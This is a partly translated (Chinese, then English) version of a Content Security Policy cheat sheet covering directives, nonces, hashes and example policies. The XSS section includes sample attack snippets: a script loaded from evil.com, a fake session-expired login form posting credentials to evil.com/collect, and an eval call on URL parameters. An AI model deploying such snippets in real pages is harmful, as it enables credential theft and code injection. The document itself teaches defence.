# 内容安全策略

## 介绍

本文提出了一种将**深度防御**概念集成到web应用程序客户端的方法。通过从服务器注入内容安全策略（CSP）头，浏览器可以感知并能够保护用户免受当前所访问的页面，加载内容时的动态调用带来的风险。([D] 可以理解为动态执行JS，DOM变更时的限制策略)

## 背景

XSS（跨站点脚本）、点击劫持和跨站泄漏等漏洞日益增长进而需要**纵深防御**的安全方法。

### 防御XSS

CSP通过以下方式防御XSS攻击：

#### 1. 限制内联脚本

通过阻止页面执行内联脚本，可以防止注入

```html
<script>document.body.innerHTML='defaced'</script>
```

上述代码则不会执行

#### 2. 限制远程脚本

通过防止页面从任意服务器加载脚本

```html
<script src="https://evil.com/hacked.js"></script>
```

上述代码则不会执行

#### 3. 限制不安全的JavaScript

通过防止页面执行文本到JavaScript的功能，如`eval`，网站将不会受到以下漏洞的影响：

```js
// A Simple Calculator
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`The sum is: ${sum}`);
```

#### 4. 限制表格提交

通过限制网站上HTML表单提交数据的位置，注入网络钓鱼表单也不会起作用。 

```html
<form method="POST" action="https://evil.com/collect">
<h3>Session expired! Please login again.</h3>
<label>Username</label>
<input type="text" name="username"/>

<label>Password</label>
<input type="password" name="pass"/>

<input type="Submit" value="Login"/>
</form>
```

#### 5.  限制对象 

通过限制HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object)标签，攻击者也不可能在页面上注入恶意flash/Java/其他遗留可执行文件。

### 防御frame攻击

点击劫持等攻击和浏览器端通道攻击（xs泄漏）的某些变体需要恶意网站在frame中加载目标网站。

历史上，`X-Frame-Options`头一直用于此目的，但它已被`Frame-Options`CSP指令淘汰。

## 纵深防御

强大的CSP针对各种类型漏洞提供了有效的第二层保护，尤其是XSS。虽然CSP不能阻止web应用程序*包含*漏洞，但它会使攻击者更难利用这些漏洞。 

即使在不接受任何用户输入的完全静态网站上，也可以使用CSP强制使用[子资源完整性（SRI）](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)。如果托管JavaScript文件（如网站访问分析脚本）的某个第三方网站受到破坏，这有助于防止在网站上加载恶意代码。 ([D] 早在15年学习HTML时，非常流行jquery，当时就思考过，托管jquery的服务器被拿下，岂不是全世界大量网站都受到影响，可以看到CSP给出了解决方法)

## CSP不能替代安全开发

CSP**不应**被视为针对XSS的唯一防御机制。您仍然必须遵循良好的开发实践，例如[防范XSS](./Cross_Site_Scripting_Prevention_Cheat_Sheet.md)中描述的实践，然后在其上部署CSP作为额外的安全层。

## 策略传递

 您可以通过三种方式向网站传递内容安全策略。 

### 1. Content-Security-Policy 头

从web服务器发送内容安全策略HTTP响应头。

```text
Content-Security-Policy: ...
```

使用头是首选方式，支持完整的CSP功能集。将其发送到所有HTTP响应中，而不仅仅是索引页。

### 2. Content-Security-Policy-Report-Only 头

通过使用 `Content-Security-Policy-Report-Only`，您可以交付一个非强制执行的CSP。

```text
Content-Security-Policy-Report-Only: ...
```

尽管如此，如果使用了`report to`和`report uri`指令，违反策略的上报事件仍会打印到控制台并传递到违反策略的端点。


浏览器完全支持网站同时使用 `Content-Security-Policy` 和`Content-Security-Policy-Report-Only` 的能力，没有任何问题。例如，可以使用这种模式来运行严格的 `Report-Only` 策略（会发现存在许多违反策略的上报事件），同时使用更宽松的强制策略（以避免破坏合法的站点功能）。

### 3. Content-Security-Policy 元标签

有时，如果您正在（例如）将HTML文件部署到一个CDN中，而头文件不受您的控制，则无法使用内容安全策略头。


在这种情况下，您仍然可以通过在HTML标记中指定`http equiv`元标签来使用CSP，如下所示：

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

几乎所有东西都仍然受到支持，包括完整的XSS防御。但是，您将无法使用[frame防御](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors),，[沙箱](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)，[日志记录违反CSP策略的端点](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)

### HTTP Headers

以下头用于CSP.

- `Content-Security-Policy` : W3C规范标准头. 由Firefox 23+、Chrome 25+和Opera 19支持+
- `Content-Security-Policy-Report-Only` : W3C规范标准头.由Firefox 23+、Chrome 25+和Opera 19+支持，策略为非阻塞（“故障开放”），并将报告发送到“report-uri”（或更新的“report-to”）指令指定的URL。这通常被用作在阻塞模式下利用CSP（“故障关闭”）的前兆
- `请勿` 使用X-Content-Security-Policy或X-WebKit-CSP。它们的实现已经过时（自Firefox 23、Chrome 25以来）、有约束、不一致，而且存在令人难以置信的缺陷。

## CSP指令

存在多种类型的指令，允许开发人员精确地控制策略流。

### Fetch 指令

Fetch指令告诉浏览器要信任的位置，并从中加载资源。

Fetch directives tell the browser the locations to trust and load resources from.

Most fetch directives have a certain [fallback list specified in w3](https://www.w3.org/TR/CSP3/#directive-fallback-list). This list allows for granular control of the source of scripts, images, files, etc.

- `child-src` allows the developer to control nested browsing contexts and worker execution contexts.
- `connect-src` provides control over fetch requests, XHR, eventsource, beacon and websockets connections.
- `font-src` specifies which URLs to load fonts from.
- `img-src` specifies the URLs that images can be loaded from.
- `manifest-src` specifies the URLs that application manifests may be loaded from.
- `media-src` specifies the URLs from which video, audio and text track resources can be loaded from.
- `prefetch-src` specifies the URLs from which resources can be prefetched from.
- `object-src` specifies the URLs from which plugins can be loaded from.
- `script-src` specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives.
    - `script-src-elem` controls the location from which execution of script requests and blocks can occur.
    - `script-src-attr` controls the execution of event handlers.
- `style-src` controls from where styles get applied to a document. This includes `<link>` elements, `@import` rules, and requests originating from a `Link` HTTP response header field.
    - `style-src-elem` controls styles except for inline attributes.
    - `style-src-attr` controls styles attributes.
- `default-src` is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of `default-src`.

### Document 指令

Document directives instruct the browser about the properties of the document to which the policies will apply to.

- `base-uri` specifies the possible URLs that the `<base>` element can use.
- `plugin-types` limits the types of resources that can be loaded into the document (*e.g.* application/pdf). 3 rules apply to the affected elements, `<embed>` and `<object>`:
    - The element needs to explicitly declare its type.
    - The element's type needs to match the declared type.
    - The element's resource need to match the declared type.
- `sandbox` restricts a page's actions such as submitting forms.
    - Only applies when used with the request header `Content-Security-Policy`.
    - Not specifying a value for the directive activates all of the sandbox restrictions. `Content-Security-Policy: sandbox;`
    - [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)

### Navigation 指令

Navigation directives instruct the browser about the locations that the document can navigate to.

- `navigate-to` restricts the URLs which a document can navigate to by any mean ([not yet supported](https://caniuse.com/?search=navigate-to) by modern browsers in Jan 2021).
- `form-action` restricts the URLs which the forms can submit to.
- `frame-ancestors` restricts the URLs that can embed the requested resource inside of  `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>` elements.
    - If this directive is specified in a `<meta>` tag, the directive is ignored.
    - This directive doesn't fallback to `default-src` directive.
    - `X-Frame-Options` is rendered obsolete by this directive and is ignored by the user agents.

### Reporting 指令

Reporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives.

- `report-to` which is a groupname defined in the header in a json formatted header value.
    - [MDN report-to documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
- `report-uri` directive is deprecated by `report-to`, which is a URI that the reports are sent to.
    - Goes by the format of: `Content-Security-Policy: report-uri https://example.com/csp-reports`

In order to ensure backward compatibility, use the 2 directives in conjunction. Whenever a browser supports `report-to`, it will ignore `report-uri`. Otherwise, `report-uri` will be used.

### 特别指令来源

| Value            | Description                                                                 |
|------------------|-----------------------------------------------------------------------------|
| 'none'           | No URLs match.                                                              |
| 'self'           | Refers to the origin site with the same scheme and port number.             |
| 'unsafe-inline'  | Allows the usage of inline scripts or styles.                               |
| 'unsafe-eval'    | Allows the usage of eval in scripts.                                        |
| 'strict-dynamic' | Informs the browser to trust scripts originating from a root trusted script.|

*Note:* `strict-dynamic` is not a standalone directive and should be used in combination with other directive values, such as `nonce`, `hashes`, etc.

To better understand how the directive sources work, check out the [source lists from w3c](https://w3c.github.io/webappsec-csp/#framework-directive-source-list).

### Hashes

When inline scripts are required, the `script-src 'hash_algo-hash'` is one option for allowing only specific scripts to execute.

```text
Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
```

To get the hash, look at Google Chrome developer tools for violations like this:

> ❌ Refused to execute inline script because it violates the following Content Security Policy directive: "..." Either the 'unsafe-inline' keyword, a hash (**'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='**), or a nonce...

You can also use this [hash generator](https://report-uri.com/home/hash). This is a great [example](https://csp.withgoogle.com/docs/faq.html#static-content) of using hashes.

#### 注意

Using hashes is generally not a very good approach. If you change *anything* inside the script tag (even whitespace) by, e.g., formatting your code, the hash will be different, and the script won't render.

### Nonces

Nonces are unique one-time-use random values that you generate for each HTTP response, and add to the Content-Security-Policy header, like so:

```js
const nonce = uuid.v4();
scriptSrc += ` 'nonce-${nonce}'`;
```

You would then pass this nonce to your view (using nonces requires a non-static HTML) and render script tags that look something like this:

```js
<script nonce="<%= nonce %>">
    ...
</script>
```

#### 警告

**Don't** create a middleware that replaces all script tags with "script nonce=..." because attacker-injected scripts will then get the nonces as well. You need an actual HTML templating engine to use nonces.

### strict-dynamic

The `strict-dynamic` directive can be used in combination with either, hashes or nonces.

If the script block is creating additional DOM elements and executing JS inside of them, `strict-dynamic` tells the browser to trust those elements.

Note that `strict-dynamic` is a CSP level 3 feature and not very widely supported yet. For more details, check out [strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).

## CSP策略示例

### Basic CSP Policy

This policy prevents cross-site framing and cross-site form-submissions. It will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute.

If your application functions with these restrictions, it drastically reduces your attack surface and works with most modern browsers.

The most basic policy assumes:

- All resources are hosted by the same domain of the document.
- There are no inlines or evals for scripts and style resources.
- There is no need for other websites to frame the website.
- There are no form-submissions to external websites.

```text
Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
```

To tighten further, one can apply the following:

```text
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

This policy allows images, scripts, AJAX, and CSS from the same origin and does not allow any other resources to load (e.g., object, frame, media, etc.).

### Upgrading insecure requests

If the developer is migrating from HTTP to HTTPS, the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP:

```text
Content-Security-Policy: upgrade-insecure-requests;
```

### Preventing framing attacks (clickjacking, cross-site leaks)

- To prevent all framing of your content use:
    - `Content-Security-Policy: frame-ancestors 'none';`
- To allow for the site itself, use:
    - `Content-Security-Policy: frame-ancestors 'self';`
- To allow for trusted domain, do the following:
    - `Content-Security-Policy: frame-ancestors trusted.com;`

### Strict Policy

A strict policy's role is to protect against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP.

Google went ahead and set up a [guide](https://web.dev/strict-csp) to adopt a strict CSP based on nonces.

Based on a [presentation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation?slide=55) at LocoMocoSec, the following two policies can be used to apply a strict policy:

- Moderate Strict Policy:

```text
script-src 'nonce-r4nd0m' 'strict-dynamic';
object-src 'none'; base-uri 'none';
```

- Locked down Strict Policy:

```text
script-src 'nonce-r4nd0m';
object-src 'none'; base-uri 'none';
```

### Refactoring inline code

When `default-src` or `script-src*` directives are active, CSP by default disables any JavaScript code placed inline in the HTML source, such as this:

```javascript
<script>
var foo = "314"
<script>
```

The inline code can be moved to a separate JavaScript file and the code in the page becomes:

```javascript
<script src="app.js">
</script>
```

With `app.js` containing the `var foo = "314"` code.

The inline code restriction also applies to `inline event handlers`, so that the following construct will be blocked under CSP:

```html
<button id="button1" onclick="doSomething()">
```

This should be replaced by `addEventListener` calls:

```javascript
document.getElementById("button1").addEventListener('click', doSomething);
```

## 引用

- [Strict CSP](https://web.dev/strict-csp)
- [CSP Level 3 W3C](https://www.w3.org/TR/CSP3/)
- [Content-Security-Policy](https://content-security-policy.com/)
- [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [CSP Wikipedia](https://en.wikipedia.org/wiki/Content_Security_Policy)
- [CSP CheatSheet by Scott Helme](https://scotthelme.co.uk/csp-cheat-sheet/)
- [Breaking Bad CSP](https://www.slideshare.net/LukasWeichselbaum/breaking-bad-csp)
- [CSP A Successful Mess Between Hardening And Mitigation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)
- [CSP Scanner](https://cspscanner.com/)
- [Content Security Policy Guide on AppSec Monkey](https://www.appsecmonkey.com/blog/content-security-policy-header/)